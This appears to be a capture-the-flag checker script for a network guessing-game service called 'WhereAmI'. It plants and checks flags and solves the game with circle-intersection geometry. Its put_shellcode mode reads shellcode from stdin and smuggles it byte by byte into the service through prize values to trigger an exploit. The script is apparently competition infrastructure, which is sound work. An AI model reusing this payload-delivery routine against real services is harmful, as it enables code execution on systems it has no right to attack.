#!/usr/bin/python

import math
import random
import sys
import os
import socket
import re

class WhereAmI:
    def __init__(self, con):
        self.con = con
        self.sink_(re.compile('Create account or log in.\n\n', re.MULTILINE))

    def sink_(self, regex):
        '''
        Reads and returns data from the specified socket until the received data
        contains the pattern specified by the given regex object.
        '''
        data = ''
        while regex.search(data) is None:
            d = self.con.recv(1)
            if d is None:
                return False
            data += d
        return data

    def close(self):
        self.con.close()

    def create_user(self, name, password):
        self.con.send('CREATE "%s" "%s"\n' % (name, password))
        d = self.sink_(re.compile('\n', re.MULTILINE))
        return d.find('User successfully') >= 0

    def log_in(self, name, password):
        self.con.send('LOGIN "%s" "%s"\n' % (name, password))
        d = self.sink_(re.compile('\n', re.MULTILINE))
        if d.find('Login successful.') >= 0:
            return True
        raise Exception(d)

    def play(self):
        self.con.send('PLAY\n')
        d = self.sink_(re.compile('\n', re.MULTILINE))
        return d.find('You have 10 tries left.') >= 0

    def guess(self, coord):
        self.con.send('GUESS %d,%d\n' % coord)
        d = self.sink_(re.compile('\n', re.MULTILINE))
        m = re.search('you were ([0-9\.]+) units off', d)
        distance = 0
        if m:
            distance = float(m.group(1))
        return distance

    def prize(self, prize):
        self.con.send('PRIZE %d\n' % prize)
        d = self.sink_(re.compile('\n', re.MULTILINE))
        m = re.search('You now have ([0-9]+) prizes.', d)
        prizes = 0
        if m:
            prizes = int(m.group(1))
        return prizes

    def won(self):
        self.con.send('WON\n')
        d = self.sink_(re.compile('\n', re.MULTILINE))
        return len(d.split(','))

    def play_session(self):
        if self.play():
            p1 = (random.randrange(10000), random.randrange(10000))
            p2 = (random.randrange(10000), random.randrange(10000))
            c1 = (p1, self.guess(p1))
            if c1[1] > 0:
                c2 = (p2, self.guess(p2))
                if c2[1] > 0:
                    intersections = intersection_points(c1, c2)
                    if intersections[0][0] < 0 or intersections[0][0] > 10000 or intersections[0][1] < 0 or intersections[0][1] > 10000:
                        intersections = (intersections[1], intersections[0])
                    if self.guess(intersections[0]) > 0:
                        self.guess(intersections[1])

def intersection_points(c1, c2):
    def point_distance(p1, p2):
        dx = p1[0] - p2[0]
        dy = p1[1] - p2[1]
        return math.sqrt(dx*dx + dy*dy)
    
    def point_sub(p1, p2):
        return (p1[0] - p2[0], p1[1] - p2[1])
    
    def point_add(p1, p2):
        return (p1[0] + p2[0], p1[1] + p2[1])
    
    def point_scale(p, scalar):
        return (p[0] * scalar, p[1] * scalar)
    
    def square(x):
        return x*x
    d = point_distance(c1[0], c2[0])
    a = (square(c1[1]) - square(c2[1]) + square(d)) / (2 * d)
    h = math.sqrt(square(c1[1]) - square(a))

    p = point_sub(c2[0], c1[0])
    p = point_scale(p, a / d)
    p = point_add(p, c1[0])

    return (
        (
            int(round(p[0] + h * (c2[0][1] - c1[0][1]) / d)),
            int(round(p[1] - h * (c2[0][0] - c1[0][0]) / d))
        ),
        (
            int(round(p[0] - h * (c2[0][1] - c1[0][1]) / d)),
            int(round(p[1] + h * (c2[0][0] - c1[0][0]) / d))
        )
    )

def plant(host, port, name, flag):
    res = 1
    try:
        con = socket.create_connection((host, port))
        w = WhereAmI(con)
        if w.create_user(name, flag):
            if w.log_in(name, flag):
                w.play_session()
                w.prize(random.randrange(256))
                res = 0
            else:
                print 'Could not log in'
        else:
            print 'Could not create user'
    except Exception as e:
        print 'Exception:', e
    return res

def check(host, port, name, flag):
    res = 1
    try:
        con = socket.create_connection((host, port))
        w = WhereAmI(con)
        if w.log_in(name, flag):
            w.play_session()
            w.prize(42)
            res = 0
        else:
            print 'Could not log in'
    except Exception as e:
        print 'Exception:', e
    return res

def random_string(l):
    s = ''
    alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    while len(s) < l:
        s += alpha[int(random.random() * len(alpha))];
    return s

def put_shellcode(host, port):
    name = random_string(14)
    password = random_string(14)
    res = 1
    if not os.isatty(0):
        shellcode = sys.stdin.read()
        try:
            con = socket.create_connection((host, port))
            w = WhereAmI(con)
            if w.create_user(name, password):
                w.log_in(name, password)

            for c in shellcode:
                w.play_session()
                w.prize(ord(c))
            res = 0
            w.won()
        except:
            pass
    return res

def help(s):
    print('Usage:')
    print('  %s -p <host> <port> <name> <flag>' % s)
    print('  %s -c <host> <port> <name> <flag>' % s)
    print('  echo "shellcode" | %s -s <host> <port>' % s)

def main(args):
    val = 1
    if len(args) > 1:
        if (args[1] == '-p' or args[1] == '--plant') and len(args) >= 6:
            val = plant(args[2], int(args[3]), args[4], args[5])
        elif (args[1] == '-c' or args[1] == '--check') and len(args) >= 6:
            val = check(args[2], int(args[3]), args[4], args[5])
        elif (args[1] == '-s' or args[1] == '--shellcode') and len(args) >= 4:
            val = put_shellcode(args[2], int(args[3]))
        else:
            help(args[0])
    else:
        help(args[0])
    return val

if __name__ == '__main__':
    exit(main(sys.argv))
